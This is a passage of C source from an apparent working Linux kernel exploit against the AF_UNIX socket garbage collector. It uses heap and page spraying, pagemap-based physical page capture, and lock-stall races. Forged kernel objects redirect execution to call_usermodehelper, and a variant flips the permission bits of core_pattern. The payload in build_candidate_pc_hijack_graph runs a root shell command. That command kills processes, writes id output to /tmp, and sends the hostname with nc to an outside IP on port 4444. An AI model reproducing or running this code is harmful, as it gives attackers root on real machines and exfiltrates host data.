					memory_order_acquire))
					sched_yield();
				futex_set(&v143r);
				while (!atomic_load_explicit(
					&v143d,
					memory_order_acquire))
					sched_yield();
				printf("[D] V143: mmap_write_lock"
				       " barrage ON\n");
				fflush(stdout);

				__atomic_store_n(&go125, 1,
					__ATOMIC_RELEASE);
				usleep(15000000);
				printf("[D] V137: pre-drain 15s done\n");
				fflush(stdout);

				pin_to_cpu(0);
				for (sender = 0;
				     sender < ARRAY_SIZE(senders);
				     sender++) {
					close(prepared_peers[sender]);
					prepared_peers[sender] = -1;
				}

				usleep(5000000);

				atomic_store_explicit(&v143x, 1,
					memory_order_release);
				pthread_join(v143t, NULL);
				printf("[D] V143: mmap_write_lock"
				       " barrage OFF\n");
				fflush(stdout);

				__atomic_store_n(&stop125, 1,
					__ATOMIC_RELEASE);
				for (t125 = 0; t125 < launched125; t125++)
					pthread_join(ft125[t125], NULL);

				{
				int total_allocs = 0;
				int total_ok = 0;
				int captured_thr = -1;
				for (t125 = 0; t125 < launched125; t125++) {
					total_allocs += fa125[t125].idx;
					int j;
					for (j = 0; j < fa125[t125].idx; j++)
						if (fa125[t125].fds[j] >= 0) total_ok++;
				}

				uint64_t fl125 = read_kpageflag_at(
					flags_fd, pfn);
				printf("[D] V126: %d thr %d/%d rings"
					" (%d kern-pages)"
					" fl=0x%llx%s%s%s\n",
					launched125, total_ok, total_allocs,
					total_ok,
					(unsigned long long)fl125,
					(fl125 & (1ULL << 26)) ?
					" PGTABLE" : "",
					(fl125 & (1ULL << KPF_SLAB)) ?
					" SLAB" : "",
					(fl125 == 0) ? " FREE" : "");
				fflush(stdout);

				/* Batch PFN check: mmap each 1-page ring,
				   check the single page per ring (FIX B2). */
				{
					int bpm = open("/proc/self/pagemap",
						O_RDONLY | O_CLOEXEC);
					int ring_blks = 1;
					int ring_sz = ring_blks * KERNEL_PAGE_SIZE;
					if (bpm >= 0) {
						for (t125 = 0; t125 < launched125 &&
						     captured_thr < 0; t125++) {
							int j;
							for (j = 0; j < fa125[t125].idx &&
							     captured_thr < 0; j++) {
								int fd = fa125[t125].fds[j];
								if (fd < 0) continue;
								void *m = mmap(NULL,
									ring_sz,
									PROT_READ | PROT_WRITE,
									MAP_SHARED, fd, 0);
								if (m == MAP_FAILED) continue;
								(void)*(volatile char *)m;
								uint64_t ent;
								uintptr_t pidx =
									(uintptr_t)m / KERNEL_PAGE_SIZE;
								if (pread(bpm, &ent, sizeof(ent),
								    (off_t)(pidx * sizeof(uint64_t)))
								    == (ssize_t)sizeof(ent)) {
									if ((ent & ((1ULL<<55)-1))
									    == pfn) {
										fa125[t125].captured_map =
										  (char *)m;
										fa125[t125].captured_fd_idx = j;
										captured_thr = t125;
									}
								}
								if (captured_thr < 0)
									munmap(m, ring_sz);
							}
						}
						close(bpm);
					}
				}

				if (captured_thr >= 0) {
					g_movable_winner =
					  (volatile unsigned char *)
					  fa125[captured_thr].captured_map;
					g_movable_winner_found = 1;
					printf("[+] V126 CAPTURED"
					  " cpu=%d k=%d tot=%d\n",
					  fa125[captured_thr].cpu,
					  fa125[captured_thr].captured_fd_idx,
					  total_ok);
					fflush(stdout);
					for (t125 = 0; t125 < launched125; t125++) {
						int j;
						for (j = 0; j < fa125[t125].fd_count; j++) {
							if (t125 == captured_thr &&
							    j == fa125[t125].captured_fd_idx)
								continue;
							if (fa125[t125].fds[j] >= 0)
								close(fa125[t125].fds[j]);
						}
						free(fa125[t125].fds);
					}
					close(flags_fd);
					return 0;
				}

				if (fl125 == 0) {
					int bp2 = open("/proc/self/pagemap",
						O_RDONLY | O_CLOEXEC);
					if (bp2 >= 0) {
					int cpu133;
					void *maps133[64] = {0};
					size_t pg_per = 65536;
					size_t sz_per = pg_per *
						(size_t)KERNEL_PAGE_SIZE;
					for (cpu133 = 0;
					     cpu133 < ncpus125 &&
					     !g_movable_winner_found;
					     cpu133++) {
						pin_to_cpu(cpu133);
						maps133[cpu133] = mmap(NULL,
							sz_per,
							PROT_READ | PROT_WRITE,
							MAP_ANONYMOUS |
							MAP_PRIVATE |
							MAP_POPULATE, -1, 0);
						if (maps133[cpu133] ==
						    MAP_FAILED) {
							maps133[cpu133] = NULL;
							continue;
						}
						size_t p2;
						for (p2 = 0; p2 < pg_per;
						     p2++) {
							void *a2 =
							  (char *)maps133[cpu133]
							  + p2 * KERNEL_PAGE_SIZE;
							*(volatile char *)a2;
							uint64_t e2;
							uintptr_t pi2 =
							  (uintptr_t)a2 /
							  KERNEL_PAGE_SIZE;
							if (pread(bp2, &e2,
							    sizeof(e2),
							    (off_t)(pi2 *
							    sizeof(e2)))
							    == (ssize_t)
							    sizeof(e2)
							    && (e2 &
							    ((1ULL<<55)-1))
							    == pfn) {
								mlock(a2,
								  KERNEL_PAGE_SIZE);
								g_movable_winner =
								  (volatile
								  unsigned char *)a2;
								g_movable_winner_found
								  = 1;
								printf("[+] V133:"
								  " pcpu capture"
								  " cpu=%d pg=%zu\n",
								  cpu133, p2);
								fflush(stdout);
								break;
							}
						}
					}
					close(bp2);
					for (cpu133 = 0; cpu133 < ncpus125;
					     cpu133++) {
						if (maps133[cpu133] &&
						    !(g_movable_winner_found &&
						    g_movable_winner >=
						    (volatile unsigned char *)
						    maps133[cpu133] &&
						    g_movable_winner <
						    (volatile unsigned char *)
						    maps133[cpu133] + sz_per))
							munmap(maps133[cpu133],
							       sz_per);
					}
					}
					if (g_movable_winner_found) {
						for (t125 = 0;
						     t125 < launched125;
						     t125++) {
							int j3;
							for (j3 = 0;
							     j3 < fa125[t125]
								.fd_count;
							     j3++)
								if (fa125[t125]
								    .fds[j3] >= 0)
								  close(
								   fa125[t125]
								   .fds[j3]);
							free(fa125[t125].fds);
						}
						close(flags_fd);
						return 0;
					}
					printf("[D] V133: per-CPU 256MB"
						" spray %d CPUs"
						" no capture\n",
						ncpus125);
					fflush(stdout);
				}

				for (t125 = 0; t125 < launched125; t125++) {
					int j;
					for (j = 0; j < fa125[t125].fd_count; j++)
						if (fa125[t125].fds[j] >= 0)
							close(fa125[t125].fds[j]);
					free(fa125[t125].fds);
				}

				printf("[D] V126: no capture"
					" pass %u\n", pass + 1);
				fflush(stdout);
				}
			}
		free(fault_pages);
		if (munmap(stall.area, stall.length) != 0)
			die("munmap private vertex drain stall");
		for (sender = 0; sender < ARRAY_SIZE(senders); sender++) {
			int pair[2];
			if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC,
				       0, pair) != 0)
				die("socketpair vertex drain re-create");
			prepared_peers[sender] = pair[1];
			close(prepared_senders[sender]);
			((int *)prepared_senders)[sender] = pair[0];
		}
		printf("[O] pc-hijack: A slab retained after"
		       " private-drain pass %u\n", pass + 1);
	}
	close(flags_fd);
	return -1;
}

static void *prepare_missing_region(size_t length)
{
	void *page;

	length = (length + KERNEL_PAGE_SIZE - 1) & ~(KERNEL_PAGE_SIZE - 1);
	page = mmap(NULL, length, PROT_READ | PROT_WRITE,
		    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (page == MAP_FAILED)
		die("mmap missing region");
	if (madvise(page, length, MADV_NOHUGEPAGE) != 0)
		die("madvise missing region");
	return page;
}

static volatile unsigned char *prepare_anon_reclaim_area(void)
{
	volatile unsigned char *map;
	size_t length = (ANON_RECLAIM_PAGES + 2) * KERNEL_PAGE_SIZE;

	map = mmap(NULL, length, PROT_READ | PROT_WRITE,
		   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (map == MAP_FAILED)
		die("mmap alias");
	if (madvise((void *)map, length, MADV_NOHUGEPAGE) != 0)
		die("madvise");
	map[0] = 1;
	map[KERNEL_PAGE_SIZE * (ANON_RECLAIM_PAGES + 1)] = 1;
	return map + KERNEL_PAGE_SIZE;
}

static void *prepare_thp_drain_area(const unsigned char *payload)
{
	unsigned char *mapping;
	unsigned char *area;
	size_t length = THP_SIZE * 2;
	size_t offset;

	mapping = mmap(NULL, length, PROT_READ | PROT_WRITE,
		       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (mapping == MAP_FAILED)
		die("mmap THP collapse area");
	area = (unsigned char *)(((uintptr_t)mapping +
				 THP_SIZE - 1) &
				~(THP_SIZE - 1));
	if (madvise(area, THP_SIZE, MADV_HUGEPAGE) != 0)
		die("madvise THP collapse area");
	for (offset = 0; offset < THP_SIZE; offset += KERNEL_PAGE_SIZE)
		memcpy(area + offset, payload, KERNEL_PAGE_SIZE);
	return area;
}

static void run_reclaim_process(
	size_t candidate, int sock, const int fds[SCM_FD_COUNT],
	uint64_t kbase, struct stage2_proc_ctrl *ctrl)
{
	int cpu = 1 - (candidate & 1);
	struct edge_xattr_spray edge_xattrs = {
		.holder_fd = -1,
	};
	struct mm_stall_ctx stall = {0};
	struct mm_stall_worker worker = {
		.ctx = &stall,
		.cpu = cpu ^ 1,
		.id = 0,
	};
	pthread_t stall_thread;
	volatile unsigned char *alias;
	unsigned char data_page_payload[KERNEL_PAGE_SIZE];
	void *collapse_area;
	int reclaim_pipes[RECLAIM_PIPE_COUNT][2];
	int reclaim_memfd;
	void *fault_page;

	pin_to_cpu(cpu);
	alias = prepare_anon_reclaim_area();
	build_data_page_payload(data_page_payload, kbase);
	collapse_area = prepare_thp_drain_area(data_page_payload);
	for (size_t pipe_i = 0; pipe_i < RECLAIM_PIPE_COUNT; pipe_i++) {
		if (pipe2(reclaim_pipes[pipe_i], O_CLOEXEC) != 0)
			die("pipe2 data-page reclaim");
	}
	reclaim_memfd = syscall(SYS_memfd_create, "page-reclaim", MFD_CLOEXEC);
	if (reclaim_memfd < 0)
		die("memfd_create data-page reclaim");
	if (ftruncate(reclaim_memfd,
		      SHMEM_RECLAIM_PAGES * KERNEL_PAGE_SIZE) != 0)
		die("ftruncate data-page reclaim");
	fault_page = prepare_missing_region(KERNEL_PAGE_SIZE);
	prepare_mm_stall(&stall, mm_stall_length);
	stall.external_run = &ctrl->stall_run;
	stall.external_started = &ctrl->stall_started;
	stall.external_stop = &ctrl->go;
	printf("[*] stage2 candidate %zu cpu=%d pid=%d maps alias=%p fault=%p stall=%p payload=%p\n",
	       candidate, cpu, getpid(), (void *)alias, fault_page, stall.area,
	       (void *)data_page_payload);
	if (pthread_create(&stall_thread, NULL, mm_write_lock_staller,
			   &worker) != 0)
		die("pthread_create mmap-lock stall");
	prepare_edge_xattr_spray(&edge_xattrs);
	futex_set(&ctrl->hole_ready);
	futex_set(&ctrl->ready);
	futex_wait_zero(&ctrl->send_go);
	futex_set(&stall.go);
	while (!atomic_load_explicit(&stall.ready, memory_order_acquire))
		sched_yield();
	sleep_usec(1000);
	futex_set(&ctrl->stall_ready);
	futex_wait_zero(&ctrl->launch_go);

	free_edge_xattr_hole(&edge_xattrs);
	atomic_store_explicit(&ctrl->entered, 1, memory_order_release);
	ctrl->ret = send_fds_iov(sock, fds, SCM_FD_COUNT,
				 fault_page, 1, 0);
	ctrl->err = ctrl->ret < 0 ? errno : 0;
	if (ctrl->ret != 0) {
		futex_set(&ctrl->send_returned);
		atomic_store_explicit(&ctrl->send_done, 1, memory_order_release);
		atomic_store_explicit(&ctrl->done, 1, memory_order_release);
		_exit(1);
	}
	atomic_store_explicit(&ctrl->send_returned, 1, memory_order_release);
	futex_wait_zero(&ctrl->spray_go);

	/*
	 * unix_free_vertices() may have just returned the target page to this
	 * CPU's PCP list. Reclaim it before any futex or parent scheduling.
	 */
	memcpy((void *)alias, data_page_payload, sizeof(data_page_payload));
	for (size_t pipe_i = 0; pipe_i < RECLAIM_PIPE_COUNT / 2; pipe_i++) {
		if (write(reclaim_pipes[pipe_i][1], data_page_payload,
			  sizeof(data_page_payload)) !=
		    (ssize_t)sizeof(data_page_payload))
			die("write data-page reclaim");
	}
	/*
	 * A RECLAIMABLE target sits on a separate PCP list. Synchronous THP
	 * compaction drains PCP pages to the buddy allocator, where the second
	 * half of the pipe spray and the anonymous spray can reclaim it.
	 */
	(void)madvise(collapse_area, THP_SIZE, MADV_COLLAPSE);
	for (size_t pipe_i = RECLAIM_PIPE_COUNT / 2;
	     pipe_i < RECLAIM_PIPE_COUNT; pipe_i++) {
		if (write(reclaim_pipes[pipe_i][1], data_page_payload,
			  sizeof(data_page_payload)) !=
		    (ssize_t)sizeof(data_page_payload))
			die("write post-collapse data-page reclaim");
	}
	for (size_t page_i = 1; page_i <= ANON_RECLAIM_PAGES; page_i++)
		memcpy((void *)(alias + page_i * KERNEL_PAGE_SIZE),
		       data_page_payload, sizeof(data_page_payload));
	for (size_t page_i = 0; page_i < SHMEM_RECLAIM_PAGES; page_i++) {
		if (pwrite(reclaim_memfd, data_page_payload,
			   sizeof(data_page_payload),
			   page_i * KERNEL_PAGE_SIZE) !=
		    (ssize_t)sizeof(data_page_payload))
			die("write shmem data-page reclaim");
	}
	atomic_store_explicit(&ctrl->send_returned, 1, memory_order_release);
	atomic_store_explicit(&ctrl->send_done, 1, memory_order_release);
	futex_wait_zero(&ctrl->trigger_go);
	atomic_store_explicit(&ctrl->done, 1, memory_order_release);
	_exit(0);
}

static void gc_flush_barrier(int sender, int passed_fd)
{
	struct msghdr msg = {0};
	struct iovec iov;
	struct cmsghdr *cmsg;
	unsigned char control[CMSG_SPACE(sizeof(int))] = {0};
	char byte = 'G';
	ssize_t ret;

	iov.iov_base = &byte;
	iov.iov_len = 1;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = control;
	msg.msg_controllen = sizeof(control);
	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	cmsg->cmsg_len = CMSG_LEN(sizeof(int));
	memcpy(CMSG_DATA(cmsg), &passed_fd, sizeof(passed_fd));

	/*
	 * The datagram path prepares the SCM FPL, synchronously flushes queued
	 * GC work, then fails its unconnected peer lookup. It publishes no edge.
	 */
	ret = sendmsg(sender, &msg, MSG_NOSIGNAL);
	if (ret >= 0 || errno != ENOTCONN)
		fail("GC flush barrier did not fail with ENOTCONN");
}

static void terminate_children(pid_t *pids, size_t count)
{
	size_t i;

	for (i = 0; i < count; i++) {
		if (pids[i] <= 0)
			continue;
		if (kill(pids[i], SIGKILL) != 0 && errno != ESRCH)
			die("kill child process");
	}
	for (i = 0; i < count; i++) {
		if (pids[i] <= 0)
			continue;
		if (waitpid(pids[i], NULL, 0) != pids[i] && errno != ECHILD)
			die("waitpid child process");
		pids[i] = 0;
	}
}

static unsigned long read_kernel_taint(void)
{
	char buffer[32];
	char *end;
	ssize_t length;
	unsigned long value;
	int fd;

	fd = open("/proc/sys/kernel/tainted", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("open kernel taint");
	length = read(fd, buffer, sizeof(buffer) - 1);
	close(fd);
	if (length <= 0)
		die("read kernel taint");
	buffer[length] = '\0';
	errno = 0;
	value = strtoul(buffer, &end, 10);
	if (errno || end == buffer)
		die("parse kernel taint");
	return value;
}

static unsigned char *packet_address_pointer(
	const struct packet_page_anchor *anchor, uint64_t address,
	size_t size)
{
	uint64_t offset;

	if (address < anchor->direct_map_address)
		fail("packet address is below mapped direct-map range");
	offset = address - anchor->direct_map_address;
	if (offset > anchor->length || size > anchor->length - offset)
		fail("packet address exceeds mapped direct-map range");
	return (unsigned char *)anchor->mapping + offset;
}

static bool candidate_vertex_was_published(
	const struct packet_page_anchor *reclaimed,
	size_t objects_per_slab)
{
	size_t slot;

	for (slot = 0; slot < objects_per_slab; slot++) {
		uint64_t vertex = reclaimed->direct_map_address + slot * 96;
		unsigned char *a = packet_address_pointer(
			reclaimed, vertex, 72);
		uint64_t next = load_u64(a, UNIX_VERTEX_ENTRY_OFFSET);
		uint64_t prev = load_u64(a, UNIX_VERTEX_ENTRY_OFFSET + 8);

		if (next != vertex + UNIX_VERTEX_ENTRY_OFFSET ||
		    prev != vertex + UNIX_VERTEX_ENTRY_OFFSET)
			return true;
	}
	return false;
}

static unsigned char *build_candidate_pc_hijack_graph(
	struct packet_page_anchor *reclaimed,
	struct packet_page_anchor *support, size_t objects_per_slab,
	uint64_t vertex_b, uint64_t kbase)
{
	uint64_t u = support->direct_map_address + PC_UNIX_SOCK_OFFSET;
	uint64_t socket = support->direct_map_address + PC_SOCKET_OFFSET;
	uint64_t file = support->direct_map_address + PC_FILE_OFFSET;
	uint64_t skb = support->direct_map_address + PC_SKB_OFFSET;
	uint64_t queue = u + UNIX_SOCK_RECEIVE_QUEUE_OFFSET;
	uint64_t path = support->direct_map_address + 0xe00;
	uint64_t dash_c = support->direct_map_address + 0xe10;
	uint64_t command = support->direct_map_address + 0xe20;
	uint64_t argv = support->direct_map_address + 0xf00;
	uint64_t completion = support->direct_map_address + 0xf40;
	unsigned char *u_bytes;
	unsigned char *socket_bytes;
	unsigned char *file_bytes;
	unsigned char *skb_bytes;
	size_t slot;

	memset((void *)reclaimed->mapping, 0, reclaimed->length);
	memset((void *)support->mapping, 0, support->length);
	u_bytes = packet_address_pointer(support, u, 0x398);
	socket_bytes = packet_address_pointer(support, socket, 0x80);
	file_bytes = packet_address_pointer(support, file, 0xb8);
	skb_bytes = packet_address_pointer(support, skb, 232);

	u_bytes[UNIX_SOCK_STATE_OFFSET] = 0;
	store_u64(u_bytes, UNIX_SOCK_RECEIVE_QUEUE_OFFSET, skb);
	store_u64(u_bytes, UNIX_SOCK_RECEIVE_QUEUE_OFFSET + 8, skb);
	store_u32(u_bytes, UNIX_SOCK_RECEIVE_QUEUE_OFFSET + 16, 1);
	store_u64(u_bytes, UNIX_SOCK_SOCKET_OFFSET, socket);
	store_u64(u_bytes, UNIX_SOCK_LISTENER_OFFSET, 0);
	/* Leave the common successor unresolved for the publishing GC pass. */
	store_u64(u_bytes, UNIX_SOCK_VERTEX_OFFSET, 0);
	store_u64(u_bytes, UNIX_VERTEX_SCC_INDEX_OFFSET, 0x80521);

	store_u64(socket_bytes, SOCKET_FILE_OFFSET, file);
	/* unix_vertex_dead() must observe total_ref == A->out_degree. */
	/* 6.8: f_count is unbiased atomic_long_t; value 1 = one reference. */
	store_u64(file_bytes, FILE_REF_OFFSET, 1);

	/* The queue splice overwrites work_struct's first list links. */
	store_u64(skb_bytes, 0, queue);
	store_u64(skb_bytes, 8, queue);
	store_u64(skb_bytes, 16, skb + 16);
	store_u64(skb_bytes, 24, skb + 16);
	store_u64(skb_bytes, 32, completion);
	store_u64(skb_bytes, 40, path);
	store_u64(skb_bytes, 48, argv);
	store_u64(skb_bytes, SKB_SCM_FPL_OFFSET, 0);
	store_u32(skb_bytes, 64, 2); /* UMH_WAIT_PROC */
	store_u32(skb_bytes, 68, 0);
	store_u64(skb_bytes, 72, 0);
	store_u64(skb_bytes, 80, 0);
	store_u64(skb_bytes, 88, 0);
	store_u64(skb_bytes, SKB_DESTRUCTOR_OFFSET,
		  kbase + g_off_call_umh_work);
	store_u64(skb_bytes, SKB_HEAD_OFFSET, 0);
	store_u32(skb_bytes, SKB_USERS_OFFSET, 1);

	memcpy((void *)support->mapping + 0xe00, "/bin/sh", 8);
	memcpy((void *)support->mapping + 0xe10, "-c", 3);
	{
		static const char helper_command[] =
			"for d in /proc/[0-9]*;do "
			"case $(readlink $d/exe 2>&-) in */payload)"
			"kill -10 ${d##*/};;esac;done;"
			"H=$(hostname);echo UMH:$H:$(id)>/tmp/.u68;"
			"echo UMH:$H|nc 129.101.121.138 4444 2>&-||:";

		memcpy((void *)support->mapping + 0xe20, helper_command,
		       sizeof(helper_command));
	}
	store_u64((unsigned char *)support->mapping + 0xf00, 0, path);
	store_u64((unsigned char *)support->mapping + 0xf00, 8, dash_c);
	store_u64((unsigned char *)support->mapping + 0xf00, 16, command);
	store_u64((unsigned char *)support->mapping + 0xf00, 24, 0);
	store_u32((unsigned char *)support->mapping + 0xf40, 0, 0);
	store_u32((unsigned char *)support->mapping + 0xf40, 4, 0);
	store_u64((unsigned char *)support->mapping + 0xf40, 8,
		  completion + 8);
	store_u64((unsigned char *)support->mapping + 0xf40, 16,
		  completion + 8);

	for (slot = 0; slot < objects_per_slab; slot++) {
		uint64_t vertex_a = reclaimed->direct_map_address + slot * 96;
		uint64_t edge = support->direct_map_address + slot * 48;
		unsigned char *a = packet_address_pointer(
			reclaimed, vertex_a, 72);
		unsigned char *edge_bytes = packet_address_pointer(
			support, edge, 48);

		store_u64(edge_bytes, 0, u);
		store_u64(edge_bytes, 8, u);
		store_u64(edge_bytes, UNIX_EDGE_VERTEX_ENTRY_OFFSET,
			  vertex_a);
		store_u64(edge_bytes, UNIX_EDGE_VERTEX_ENTRY_OFFSET + 8,
			  vertex_a);
		store_u64(a, 0, edge + UNIX_EDGE_VERTEX_ENTRY_OFFSET);
		store_u64(a, 8, edge + UNIX_EDGE_VERTEX_ENTRY_OFFSET);
		store_u64(a, UNIX_VERTEX_ENTRY_OFFSET,
			  vertex_a + UNIX_VERTEX_ENTRY_OFFSET);
		store_u64(a, UNIX_VERTEX_ENTRY_OFFSET + 8,
			  vertex_a + UNIX_VERTEX_ENTRY_OFFSET);
		store_u64(a, UNIX_VERTEX_SCC_OFFSET,
			  vertex_b + UNIX_VERTEX_SCC_OFFSET);
		store_u64(a, UNIX_VERTEX_SCC_OFFSET + 8,
			  vertex_b + UNIX_VERTEX_SCC_OFFSET);
		store_u64(a, UNIX_VERTEX_OUT_DEGREE_OFFSET, 1);
		store_u64(a, UNIX_VERTEX_INDEX_OFFSET, 0);
		store_u64(a, UNIX_VERTEX_SCC_INDEX_OFFSET, 0x80521);
	}
	atomic_thread_fence(memory_order_seq_cst);
	return skb_bytes;
}

static void build_dirtymode_graph(
	struct packet_page_anchor *reclaimed,
	struct packet_page_anchor *support, size_t objects_per_slab,
	uint64_t vertex_b, uint64_t kbase)
{
	uint64_t mode = kbase + g_off_coredump_sysctls +
		CTL_TABLE_CORE_PATTERN_MODE;
	unsigned char *skb = build_candidate_pc_hijack_graph(
		reclaimed, support, objects_per_slab, vertex_b, kbase);

	/*
	 * skb_dst_drop() clears the low flag bit and calls dst_release().  The
	 * latter atomically decrements dst->__rcuref at +0x40.  This supplies a
	 * four-byte data-only decrement at any even kernel address.  0644 - 1
	 * is 0643, which adds the world-write bit checked by proc_sys_permission.
	 */
	store_u64(skb, SKB_REFDST_OFFSET, mode - DST_RCUREF_OFFSET);
	store_u64(skb, SKB_DESTRUCTOR_OFFSET, 0);
	atomic_thread_fence(memory_order_seq_cst);
	printf("[+] DirtyMode decrement target=%#llx (core_pattern.mode)\n",
	       (unsigned long long)mode);
}

static void run_pc_hijack_attempt(uint64_t kbase,
				   uint64_t direct_map_window,
				   int dm_delta)
{
	struct packet_page_anchor a_anchor;
	struct packet_page_anchor b_anchor;
	struct packet_page_anchor eviction;
	struct packet_page_anchor support;
	struct packet_page_anchor reclaimed;
	struct anchored_vertex a_vertex;
	struct anchored_vertex b_vertex;
	struct vertex_prefill_gate *pc_vertex_prefill[VERTEX_PREFILL_CPU_COUNT];
	struct cache_geometry geometry;
	struct splice_ctx splice_ctx = {0};
	struct gc_close_ctx gc_closer = {0};
	struct mm_stall_ctx stage_gate = {0};
	struct mm_stall_worker stage_gate_worker = {
		.ctx = &stage_gate,
		.cpu = 0,
		.id = 0,
	};
	struct stage2_ctx stage1 = {0};
	atomic_int stage1_hold;
	atomic_int stage_gate_run;
	atomic_int stage_gate_started;
	atomic_int stage_gate_stop;
	pthread_t splice_thread;
	pthread_t stage1_thread;
	pthread_t gc_close_thread;
	pthread_t stage_gate_thread;
	uint64_t direct_map_base;
	size_t objects_per_slab;
	size_t eviction_length;
	size_t classifier_messages;
	size_t i;
	int vertex_cache;
	int control_fd;
	int classifier_holder[2];
	int ab[2];
	int bb[2];
	int old_client;
	int stage_client;
	int *prepared_reclaim_fds;
	int filler[2];
	int trigger_pressure[2];
	int stall_sock[2];
	int stall_pipe[2];
	int init_done[2];
	int signal1[2];
	int marker[2];
	int old_special[3];
	int filler_fds[SCM_FD_COUNT];
	int barrier_sender;
	int barrier_fd;
	int null_fd;
	int prepared_vertex_drain_fds[VERTEX_SHEAF_DRAIN_SENDERS];
	int prepared_vertex_drain_peers[VERTEX_SHEAF_DRAIN_SENDERS];
	int large_sndbuf = LARGE_SNDBUF;
	char page_data[KERNEL_PAGE_SIZE];
	char wchan[128] = "unknown";
	void *stage1_fault_page;
	atomic_int gc_after_mmap_block;
	int rcl_ncpus;
	int rcl_kpc_fd = -1, rcl_kpf_fd = -1;
	volatile unsigned char **rcl_mappings = NULL;

	create_packet_page_anchor(&a_anchor, KERNEL_PAGE_SIZE);
	direct_map_base = direct_map_window +
		(int64_t)dm_delta * (int64_t)GIB;
	printf("[+] direct-map base: delta=%d -> %#llx\n",
	       dm_delta, (unsigned long long)direct_map_base);
	a_anchor.direct_map_address =
		direct_map_base + a_anchor.pfn * KERNEL_PAGE_SIZE;
	create_packet_page_anchor(&b_anchor, KERNEL_PAGE_SIZE);
	create_packet_page_anchor(&support, KERNEL_PAGE_SIZE);
	b_anchor.direct_map_address =
		direct_map_base + b_anchor.pfn * KERNEL_PAGE_SIZE;
	support.direct_map_address =
		direct_map_base + support.pfn * KERNEL_PAGE_SIZE;
	printf("[D] anchors: a=%#llx b=%#llx s=%#llx\n",
	       (unsigned long long)a_anchor.pfn,
	       (unsigned long long)b_anchor.pfn,
	       (unsigned long long)support.pfn);
	detect_l2_geometry(&geometry);
	eviction_length = geometry.ways * geometry.sets *
		geometry.line_size;
	create_packet_page_anchor(&eviction, eviction_length);
	eviction.direct_map_address =
		direct_map_base + eviction.pfn * KERNEL_PAGE_SIZE;
	vertex_cache = classify_vertex_cache_for_pc(
		&control_fd, classifier_holder, &classifier_messages,
		&objects_per_slab);
	printf("[D] vertex: cache=%d per_slab=%zu L2=%zux%zux%zu\n",
	       vertex_cache, objects_per_slab,
	       geometry.ways, geometry.sets, geometry.line_size);
	for (i = 0; i < ARRAY_SIZE(pc_vertex_prefill); i++) {
		pc_vertex_prefill[i] = prepare_vertex_prefill((int)i);
		publish_vertex_prefill(pc_vertex_prefill[i]);
	}
	/* V112: drain kmalloc-96 free list before anchor */
	pin_to_cpu(0);
	predrain_kmalloc96(vertex_cache);
	/* Keep anchor traffic out of root's automatic-GC inflight counter. */
	if (syscall(SYS_setresuid, 45000U, 0, 0) != 0)
		die("setresuid pc anchor allocator");
	anchor_vertex_on_packet_page(
		&a_anchor, vertex_cache, objects_per_slab - 1, false,
		&a_vertex);
	printf("[D] a_anchor done at index %zu\n", a_vertex.target_index);
	fflush(stdout);
	anchor_vertex_on_packet_page(
		&b_anchor, vertex_cache, 0, false, &b_vertex);
	printf("[D] b_anchor done at index %zu\n", b_vertex.target_index);
	fflush(stdout);
	b_vertex.address = localize_replaced_vertex(
		&b_vertex, false, &b_anchor, &eviction,
		control_fd, objects_per_slab);
	printf("[D] b_vertex addr=%#llx\n",
	       (unsigned long long)b_vertex.address);
	fflush(stdout);
	release_packet_page_anchor(&eviction);
	if (syscall(SYS_setresuid, 0, 0, 0) != 0)
		die("restore root GC allocator identity");
	for (i = 0; i < classifier_messages; i++)
		recv_and_close_fds(classifier_holder[1], ORACLE_BATCH);
	close(classifier_holder[0]);
	close(classifier_holder[1]);

	ab[0] = anchored_vertex_fd(&a_vertex);
	ab[1] = anchored_vertex_peer(&a_vertex);
	bb[0] = anchored_vertex_fd(&b_vertex);
	bb[1] = anchored_vertex_peer(&b_vertex);
	old_client = bb[1];
	stage_client = bb[1];
	if (make_unix_socketpair(filler) ||
	    make_unix_socketpair(trigger_pressure) ||
	    make_unix_socketpair(stall_sock) ||
	    pipe2(stall_pipe, O_CLOEXEC) ||
	    pipe2(init_done, O_CLOEXEC) ||
	    pipe2(signal1, O_CLOEXEC) ||
	    pipe2(marker, O_CLOEXEC))
		die("pc-hijack stage1 descriptors");
	for (i = 0; i < 4; i++) {
		if (dup(filler[0]) < 0)
			die("dup pc-hijack filler cycle");
	}
	null_fd = open("/dev/null", O_RDONLY | O_CLOEXEC);
	barrier_sender = socket(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0);
	barrier_fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (null_fd < 0 || barrier_sender < 0 || barrier_fd < 0)
		die("pc-hijack barrier descriptors");

	for (i = 0; i < ARRAY_SIZE(filler_fds); i++)
		filler_fds[i] = null_fd;
	if (syscall(SYS_setresuid, GC_TRIGGER_UID, 0, 0) != 0)
		die("setresuid GC trigger pressure");
	for (i = 0; i < GC_FILLER_BATCHES; i++) {
		if (send_fds(trigger_pressure[1], filler_fds,
			     ARRAY_SIZE(filler_fds), 'T') != 0)
			die("GC trigger inflight pressure");
	}
	if (syscall(SYS_setresuid, 0, 0, 0) != 0)
		die("restore root after GC trigger pressure");
	for (i = 0; i < GC_FILLER_BATCHES; i++) {
		if (i == GC_FILLER_BATCHES - 1)
			filler_fds[0] = filler[0];
		if (send_fds(filler[1], filler_fds,
			     ARRAY_SIZE(filler_fds), 'K') != 0)
			die("pc-hijack filler inflight batch");
	}

	printf("[D] filler done, graph setup\n"); fflush(stdout);
	if (fcntl(stall_pipe[0], F_SETPIPE_SZ, KERNEL_PAGE_SIZE) < 0)
		die("pc-hijack F_SETPIPE_SZ");
	memset(page_data, 'P', sizeof(page_data));
	if (write(stall_pipe[1], page_data, sizeof(page_data)) !=
	    (ssize_t)sizeof(page_data))
		die("pc-hijack write stall pipe");
	if (fill_sender_wmem(stall_sock[0]) != 0)
		die("pc-hijack fill stall socket");
	splice_ctx.pipe_read = stall_pipe[0];
	splice_ctx.sock = stall_sock[0];
	atomic_init(&splice_ctx.ready, 0);
	atomic_init(&splice_ctx.done, 0);
	if (pthread_create(&splice_thread, NULL, splice_staller,
			   &splice_ctx) != 0)
		die("pthread_create pc-hijack splice");
